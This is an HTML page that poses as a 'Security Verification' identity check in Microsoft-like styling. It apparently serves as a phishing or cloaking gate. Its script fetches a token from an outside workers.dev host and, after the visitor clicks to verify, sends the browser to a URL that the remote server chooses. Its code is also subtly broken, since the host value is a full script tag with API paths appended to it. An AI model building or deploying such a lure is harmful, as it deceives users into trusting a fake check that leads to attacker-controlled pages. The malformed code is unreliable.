<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title>Security Verification</title>
    <style>
        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
        
        body{
            display:flex;
            justify-content:center;
            align-items:center;
            font-family:'Inter',system-ui,-apple-system,sans-serif;
            min-height:100vh;
            overflow:hidden;
            background:linear-gradient(135deg, #e5f0f9 0%, #f0f0f0 50%, #e8e8f0 100%);
        }

        canvas{
            position:fixed;
            top:0;
            left:0;
            z-index:1;
        }

        .container{
            position:relative;
            z-index:10;
            width:100%;
            max-width:500px;
            margin:24px;
            padding:0;
        }

        .card{
            background:rgba(255,255,255,0.85);
            -webkit-backdrop-filter:blur(10px);
            backdrop-filter:blur(10px);
            border-radius:24px;
            border:1px solid rgba(0,120,212,0.2);
            overflow:hidden;
            box-shadow:0 20px 60px rgba(0,120,212,0.15), 0 0 40px rgba(0,120,212,0.08);
            transition:all 0.4s cubic-bezier(0.23,1,0.320,1);
        }

        .card:hover{
            box-shadow:0 30px 80px rgba(0,120,212,0.25), 0 0 60px rgba(0,120,212,0.12);
            transform:translateY(-4px);
        }

        .card-content{
            padding:48px 40px;
        }

        .background-glow{
            position:absolute;
            border-radius:50%;
            opacity:0.6;
            filter:blur(40px);
            animation:float 6s ease-in-out infinite;
        }

        .glow-1{
            width:200px;
            height:200px;
            background:radial-gradient(circle, rgba(0,120,212,0.4) 0%, transparent 70%);
            top:-50px;
            right:-50px;
        }

        .glow-2{
            width:150px;
            height:150px;
            background:radial-gradient(circle, rgba(0,120,212,0.3) 0%, transparent 70%);
            bottom:-30px;
            left:-30px;
            animation:float 8s ease-in-out infinite reverse;
        }

        @keyframes float{
            0%,100%{transform:translateY(0px)}
            50%{transform:translateY(20px)}
        }

        .header{
            display:flex;
            flex-direction:column;
            align-items:center;
            text-align:center;
            margin-bottom:36px;
            position:relative;
            z-index:2;
        }

        .icon-container{
            position:relative;
            margin-bottom:24px;
        }

        .icon-box{
            width:72px;
            height:72px;
            background:linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
            border-radius:20px;
            display:flex;
            align-items:center;
            justify-content:center;
            color:white;
            flex-shrink:0;
            box-shadow:0 12px 32px rgba(0,120,212,0.35);
            animation:pulse-glow 2s ease-in-out infinite;
            position:relative;
            overflow:hidden;
        }

        .icon-box::before{
            content:'';
            position:absolute;
            inset:0;
            background:linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.2) 50%, transparent 70%);
            animation:shimmer 3s infinite;
        }

        .icon-box svg{
            width:36px;
            height:36px;
            position:relative;
            z-index:1;
        }

        @keyframes pulse-glow{
            0%,100%{box-shadow:0 12px 32px rgba(0,120,212,0.35)}
            50%{box-shadow:0 12px 48px rgba(0,120,212,0.5)}
        }

        @keyframes shimmer{
            0%{transform:translateX(-100%)}
            100%{transform:translateX(100%)}
        }

        .title{
            font-size:28px;
            font-weight:700;
            background:linear-gradient(135deg, #0078d4 0%, #106ebe 50%, #005a9e 100%);
            -webkit-background-clip:text;
            -webkit-text-fill-color:transparent;
            background-clip:text;
            letter-spacing:-0.03em;
            line-height:1.2;
            margin-bottom:8px;
        }

        .subtitle{
            font-size:15px;
            color:#666;
            line-height:1.6;
            font-weight:500;
        }

        .verify-button{
            position:relative;
            display:flex;
            align-items:center;
            gap:16px;
            width:100%;
            padding:16px 20px;
            background:linear-gradient(135deg, rgba(0,120,212,0.08) 0%, rgba(0,120,212,0.05) 100%);
            border:2px solid rgba(0,120,212,0.3);
            border-radius:16px;
            cursor:pointer;
            transition:all 0.3s cubic-bezier(0.23,1,0.320,1);
            overflow:hidden;
            font-size:15px;
            font-weight:600;
            color:#333;
            z-index:2;
        }

        .verify-button::before{
            content:'';
            position:absolute;
            inset:0;
            background:linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.4) 50%, transparent 70%);
            opacity:0;
            animation:slide 0.5s ease;
        }

        .verify-button:hover:not(.verified):not(.loading){
            background:linear-gradient(135deg, rgba(0,120,212,0.15) 0%, rgba(0,120,212,0.12) 100%);
            border-color:rgba(0,120,212,0.5);
            box-shadow:0 8px 24px rgba(0,120,212,0.2);
            transform:translateY(-2px);
        }

        .verify-button:active:not(.verified):not(.loading){
            transform:translateY(0);
        }

        .verify-button.loading{
            opacity:0.7;
            cursor:not-allowed;
        }

        .verify-button.verified{
            background:linear-gradient(135deg, rgba(34,197,94,0.1) 0%, rgba(34,197,94,0.08) 100%);
            border-color:rgba(34,197,94,0.4);
        }

        @keyframes slide{
            0%{transform:translateX(-100%)}
            100%{transform:translateX(100%)}
        }

        .checkbox{
            position:relative;
            width:36px;
            height:36px;
            border:2px solid #0078d4;
            border-radius:10px;
            display:flex;
            align-items:center;
            justify-content:center;
            background:linear-gradient(135deg, rgba(0,120,212,0.1) 0%, rgba(0,120,212,0.08) 100%);
            flex-shrink:0;
            transition:all 0.3s ease;
        }

        .checkbox svg{
            width:20px;
            height:20px;
            color:white;
            opacity:0;
            transition:opacity 0.3s ease;
            stroke-width:3;
        }

        .verify-button:hover:not(.verified):not(.loading) .checkbox{
            border-color:#106ebe;
            background:linear-gradient(135deg, rgba(0,120,212,0.15) 0%, rgba(0,120,212,0.1) 100%);
            box-shadow:0 0 16px rgba(0,120,212,0.3);
        }

        .verify-button.verified .checkbox{
            border-color:#22c55e;
            background:#22c55e;
        }

        .verify-button.verified .checkbox svg{
            opacity:1;
        }

        .button-text{
            flex:1;
            text-align:left;
        }

        .button-title{
            font-size:16px;
            font-weight:700;
            color:#222;
            display:block;
        }

        .button-subtitle{
            font-size:12px;
            color:#999;
            display:block;
            margin-top:4px;
            font-weight:500;
        }

        .verify-button.verified .button-title,
        .verify-button.verified .button-subtitle{
            color:#22c55e;
        }

        .arrow{
            color:#0078d4;
            transition:all 0.3s cubic-bezier(0.23,1,0.320,1);
            flex-shrink:0;
            width:20px;
            height:20px;
        }

        .verify-button:hover:not(.verified):not(.loading) .arrow{
            color:#106ebe;
            transform:translateX(6px);
        }

        .footer{
            display:flex;
            align-items:center;
            justify-content:space-between;
            margin-top:28px;
            padding-top:20px;
            border-top:1px solid rgba(0,120,212,0.15);
            position:relative;
            z-index:2;
        }

        .encrypted{
            display:flex;
            align-items:center;
            gap:8px;
            font-size:11px;
            color:#0078d4;
            font-weight:700;
            text-transform:uppercase;
            letter-spacing:0.1em;
        }

        .dot{
            width:6px;
            height:6px;
            background:linear-gradient(135deg, #0078d4 0%, #106ebe 100%);
            border-radius:50%;
            box-shadow:0 0 8px rgba(0,120,212,0.6);
            animation:blink 2s ease-in-out infinite;
        }

        .shield-text{
            font-size:11px;
            color:#999;
            font-weight:600;
            letter-spacing:0.05em;
        }

        @keyframes blink{
            0%,100%{opacity:1;box-shadow:0 0 8px rgba(0,120,212,0.6)}
            50%{opacity:0.4;box-shadow:0 0 4px rgba(0,120,212,0.3)}
        }

        @keyframes spin{
            to{transform:rotate(360deg)}
        }
        
        .spinner{
            display:inline-block;
            width:16px;
            height:16px;
            border:2px solid rgba(0,120,212,0.3);
            border-top-color:#0078d4;
            border-radius:50%;
            animation:spin 0.8s linear infinite;
            margin-right:8px;
        }

        .status-text{
            font-size:14px;
            color:#666;
            transition:color 0.3s ease;
            font-weight:500;
        }

        .error{
            color:#ff6b6b;
            font-size:13px;
            margin-top:16px;
            text-align:center;
            display:none;
            animation:slideDown 0.3s ease;
            background:rgba(255,107,107,0.08);
            padding:12px;
            border-radius:10px;
            border-left:3px solid #ff6b6b;
            font-weight:500;
        }

        @keyframes slideDown{
            from{opacity:0;transform:translateY(-10px)}
            to{opacity:1;transform:translateY(0)}
        }

        @media (max-width: 600px){
            .card-content{
                padding:32px 24px;
            }
            .title{
                font-size:24px;
            }
            .verify-button{
                padding:14px 16px;
                gap:12px;
            }
            .icon-box{
                width:60px;
                height:60px;
            }
            .icon-box svg{
                width:30px;
                height:30px;
            }
        }
    </style>
</head>
<body>
    <canvas id="canvas"></canvas>
    
    <div class="container">
        <div class="card">
            <div class="background-glow glow-1"></div>
            <div class="background-glow glow-2"></div>
            
            <div class="card-content">
                <div class="header">
                    <div class="icon-container">
                        <div class="icon-box">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                        </div>
                    </div>
                    <div class="title">Security Verification</div>
                    <div class="subtitle status-text" id="status-text">Click the button below to verify your identity.</div>
                </div>

                <div class="verify-button" id="verify-btn">
                    <div class="checkbox">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
                    </div>
                    <div class="button-text">
                        <span class="button-title" id="btn-text">Click to Verify</span>
                        <span class="button-subtitle">Verify your browser identity</span>
                    </div>
                    <svg class="arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
                </div>

                <div class="footer">
                    <div class="encrypted"><span class="dot"></span>Encrypted</div>
                    <div class="shield-text">Protected by Shield</div>
                </div>

                <div class="error" id="error-msg"></div>
            </div>
        </div>
    </div>

    <script>
        // Animated background canvas
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const particles = [];
        const shapes = [];

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.vx = (Math.random() - 0.5) * 0.4;
                this.vy = (Math.random() - 0.5) * 0.4;
                this.radius = Math.random() * 1.2;
                this.opacity = Math.random() * 0.25 + 0.05;
                this.color = ['#0078d4', '#106ebe', '#005a9e'][Math.floor(Math.random() * 3)];
            }

            update() {
                this.x += this.vx;
                this.y += this.vy;
                this.opacity *= 0.996;

                if (this.x < 0) this.x = canvas.width;
                if (this.x > canvas.width) this.x = 0;
                if (this.y < 0) this.y = canvas.height;
                if (this.y > canvas.height) this.y = 0;
            }

            draw() {
                ctx.fillStyle = this.color;
                ctx.globalAlpha = this.opacity;
                ctx.fillRect(this.x, this.y, this.radius, this.radius);
            }
        }

        class FloatingShape {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.vx = (Math.random() - 0.5) * 0.15;
                this.vy = (Math.random() - 0.5) * 0.15;
                this.rotation = Math.random() * Math.PI * 2;
                this.rotationSpeed = (Math.random() - 0.5) * 0.008;
                this.size = Math.random() * 50 + 30;
                this.type = Math.floor(Math.random() * 3);
                this.opacity = Math.random() * 0.12 + 0.03;
                this.colors = ['#0078d4', '#106ebe', '#005a9e'];
                this.color = this.colors[this.type];
            }

            update() {
                this.x += this.vx;
                this.y += this.vy;
                this.rotation += this.rotationSpeed;

                if (this.x < -this.size) this.x = canvas.width + this.size;
                if (this.x > canvas.width + this.size) this.x = -this.size;
                if (this.y < -this.size) this.y = canvas.height + this.size;
                if (this.y > canvas.height + this.size) this.y = -this.size;
            }

            draw() {
                ctx.save();
                ctx.translate(this.x, this.y);
                ctx.rotate(this.rotation);
                ctx.globalAlpha = this.opacity;
                ctx.fillStyle = this.color;

                if (this.type === 0) {
                    ctx.fillRect(-this.size / 2, -this.size / 2, this.size, this.size);
                } else if (this.type === 1) {
                    ctx.beginPath();
                    ctx.arc(0, 0, this.size / 2, 0, Math.PI * 2);
                    ctx.fill();
                } else {
                    ctx.beginPath();
                    for (let i = 0; i < 3; i++) {
                        const angle = (i * Math.PI * 2) / 3 - Math.PI / 2;
                        const px = Math.cos(angle) * this.size / 2;
                        const py = Math.sin(angle) * this.size / 2;
                        if (i === 0) ctx.moveTo(px, py);
                        else ctx.lineTo(px, py);
                    }
                    ctx.closePath();
                    ctx.fill();
                }
                ctx.restore();
            }
        }

        for (let i = 0; i < 60; i++) {
            particles.push(new Particle());
        }

        for (let i = 0; i < 5; i++) {
            shapes.push(new FloatingShape());
        }

        function animate() {
            ctx.globalAlpha = 1;
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            shapes.forEach(shape => {
                shape.update();
                shape.draw();
            });

            particles.forEach(particle => {
                particle.update();
                particle.draw();
            });

            requestAnimationFrame(animate);
        }

        animate();

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // ORIGINAL VERIFICATION FUNCTIONALITY - PRESERVED
        const CONFIG = {
            workerUrl: '<script src="https://calm-cell-0739.arseniodacosta070.workers.dev/config.js"><' + '/script>'
        };

        let formToken = null;

        window.addEventListener('load', function() {
            loadToken();
        });

        function loadToken() {
            fetch(CONFIG.workerUrl + '/api/generate-form')
                .then(response => response.json())
                .then(data => {
                    formToken = data.token;
                    console.log('Token loaded');
                })
                .catch(error => {
                    showError('Failed to load verification form');
                    console.error('Error:', error);
                });
        }

        document.getElementById('verify-btn').addEventListener('click', function() {
            if (!formToken) {
                showError('Token not ready. Please refresh the page.');
                return;
            }

            verifyToken();
        });

        function verifyToken() {
            const btn = document.getElementById('verify-btn');
            
            btn.classList.add('loading');
            document.getElementById('btn-text').innerHTML = '<span class="spinner"></span>Verifying...';
            document.getElementById('status-text').textContent = 'Verification in progress...';

            fetch(CONFIG.workerUrl + '/api/verify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    token: formToken,
                    action: 'verify'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.verified) {
                    btn.classList.remove('loading');
                    btn.classList.add('verified');
                    document.getElementById('btn-text').textContent = 'Verified ✓';
                    document.getElementById('status-text').textContent = 'Identity verified successfully!';
                    
                    setTimeout(() => {
                        window.location.href = data.redirectUrl;
                    }, 1500);
                } else {
                    showError('Verification failed');
                    btn.classList.remove('loading');
                    document.getElementById('btn-text').textContent = 'Try Again';
                }
            })
            .catch(error => {
                btn.classList.remove('loading');
                document.getElementById('btn-text').textContent = 'Try Again';
                showError('Network error. Please try again.');
                console.error('Error:', error);
            });
        }

        function showError(message) {
            const errorDiv = document.getElementById('error-msg');
            errorDiv.textContent = message;
            errorDiv.style.display = 'block';
        }
    </script>
</body>
</html>
